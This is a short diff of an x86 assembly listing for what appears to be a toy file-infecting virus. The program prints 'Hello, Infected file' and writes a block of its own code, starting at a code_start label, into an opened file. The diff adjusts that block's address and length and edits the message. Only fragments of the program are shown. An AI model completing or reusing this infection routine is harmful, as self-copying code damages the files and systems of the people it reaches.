@@ -1,7 +1,7 @@
      1                                  section .data
-     2 00000000 48656C6C6F2C20496E-     hello_infected: db "Hello, Infected file!",10,0
+     2 00000000 48656C6C6F2C20496E-     hello_infected: db "Hello, Infected file",10,0
      2 00000009 666563746564206669-
-     2 00000012 6C65210A00         
+     2 00000012 6C650A00           
      3                                  
      4                                  section .text
      5                                  global _start
@@ -58,7 +58,7 @@
     56 00000045 B804000000                      mov eax,4 ;sys_write
     57 0000004A BB01000000                      mov ebx, 1 ;stdout
     58 0000004F B9[00000000]                    mov ecx, hello_infected ; insert location in memory
-    59 00000054 BA17000000                      mov edx, 23 ; length of the string
+    59 00000054 BA16000000                      mov edx, 22 ; length of the string
     60 00000059 CD80                            int 0x80
     61 0000005B 9D                              popfd
     62 0000005C 61                              popad
@@ -78,8 +78,8 @@
     76 0000007B 8945FC                          mov [ebp -4], eax ; save file descriptor
     77 0000007E B804000000                      mov eax,4 ;sys_write
     78 00000083 8B5DFC                          mov ebx, [ebp-4] ; file descriptor
-    79 00000086 B940000000                      mov ecx, 0x40
-    80 0000008B BA62000000                      mov edx, 98
+    79 00000086 B9[40000000]                    mov ecx, code_start
+    80 0000008B BA63000000                      mov edx, 99
     81 00000090 CD80                            int 0x80
     82 00000092 B806000000                      mov eax, 6
     83 00000097 8B5DFC                          mov ebx, [ebp-4]
